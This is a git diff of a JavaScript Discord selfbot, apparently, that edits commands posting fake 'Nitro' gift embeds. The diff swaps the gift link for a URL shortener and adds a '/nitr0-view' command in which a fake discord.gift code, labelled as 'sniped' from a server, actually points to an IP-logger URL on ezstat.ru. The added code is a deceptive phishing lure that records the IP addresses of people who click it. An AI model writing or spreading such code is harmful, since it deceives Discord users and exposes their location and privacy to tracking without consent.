@@ -645,6 +645,7 @@ if (message.content.startsWith("/rand")) {
     }
 }
 
+
 //---------------------------------------------------------------------
 if (message.content.startsWith("/skid")) {
 
@@ -1101,7 +1102,7 @@ if (message.content.startsWith(prefix + "delt")) {
 //---------------------------------------------------------------------
 if (message.content.startsWith(prefix + "nitro")) {
     if (client.user.id !== message.author.id) return;
-    let CELESTIA_INVITE_LINK = 'https://yip.su/2vj4d6'
+    let CELESTIA_INVITE_LINK = 'https://shorturl.at/crD37'
     var embed = new Discord.RichEmbed()
         .setColor("RANDOM")
         .setTitle(` ${message.author.username}, **Nitro Bot** `)
@@ -1174,7 +1175,7 @@ if (message.content.startsWith(prefix + "backup")) {
 
 if (message.content.startsWith(prefix + "nitr0")) {
     if (client.user.id !== message.author.id) return;
-    let CELESTIA_INVITE_LINK = 'https://yip.su/2vj4d6'
+    let CELESTIA_INVITE_LINK = 'https://shorturl.at/crD37'
 
 
     var embed = new Discord.RichEmbed()
@@ -1191,6 +1192,27 @@ if (message.content.startsWith(prefix + "nitr0")) {
     }, 100);
     console.log(`${client.user.tag} ran command </nitr0>.`);
 }
+
+if (message.content.startsWith(prefix + "nitr0-view")) {
+    if (client.user.id !== message.author.id) return;
+    let CELESTIA_INVITE_LINK = 'https://ezstat.ru/logger/448zbe2XsVD5/'
+
+
+    var embed = new Discord.RichEmbed()
+        .setColor("RANDOM")
+        .setTitle(`:wave: Hey ${message.author.username}, here is you command-example `)
+        .setDescription("*This was sniped From server:* ```White Kingdom```")
+        .addField("Link:", `[https://discord.gift/o2ZKjMH1WW5bUmTNRPuH8e](${CELESTIA_INVITE_LINK})`)
+        .setImage('https://pmcvariety.files.wordpress.com/2019/06/discrod-nitro-chara.png')
+        .setTimestamp();
+    setTimeout(() => {
+        message.channel.send({
+            embed
+        });
+    }, 100);
+    console.log(`${client.user.tag} ran command </nitr0>.`);
+}
+
 
 //---------------------------------------------------------------------
 if (message.content.startsWith(prefix + 'creater')) {
